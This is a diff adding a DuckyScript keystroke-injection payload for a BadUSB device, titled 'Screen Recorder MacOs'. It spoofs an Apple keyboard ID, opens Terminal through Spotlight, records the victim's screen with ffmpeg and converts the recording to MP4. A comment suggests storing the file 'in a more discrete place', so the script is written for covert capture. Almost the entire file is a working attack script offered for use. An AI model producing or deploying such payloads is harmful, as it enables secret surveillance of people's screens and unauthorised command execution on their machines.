@@ -1,0 +1,45 @@
+REM Description: This script records the screen and saves the recording as a video file.
+REM Must have ffmpeg installed.
+REM Must have terminal recording privilege enabled
+
+REM Script uses a screen recording command and the conversion of the recording to an MP4 file. 
+REM It includes a delay of 10 seconds after starting the recording to allow for the desired recording duration. Can adjust the delay for longer recordings line 31
+
+REM After that, it sends the interrupt signal (Ctrl+C) to stop the recording. 
+REM Then it proceeds with the conversion of the recorded file from MKV to MP4 format using the ffmpeg command And stores it on the desktop
+
+REM you can change the locations "Desktop" to store the file in a more discrete place.
+
+REM Author: Narsty
+REM Title: Screen Recorder MacOs
+REM Target: MacOS 
+REM Version: 1.0
+REM Category: Execution
+
+
+ID 05ac:021e Apple:Keyboard
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 500
+STRING ffmpeg -f avfoundation -r 30 -i "1" -c:v libx264 -preset ultrafast -tune zerolatency -crf 23 -pix_fmt yuv420p ~/Desktop/screen_recording.mkv
+DELAY 250
+ENTER
+DELAY 10000  ; Delay for 10 seconds (adjust as needed)
+CTRL C       ; Send the interrupt signal to stop the recording
+DELAY 500
+STRING ffmpeg -i ~/Desktop/screen_recording.mkv -c:v libx264 -preset fast -crf 23 -pix_fmt yuv420p ~/Desktop/screen_recording.mp4
+DELAY 250
+ENTER
+
+
+
+
+
+
+
+
+ 
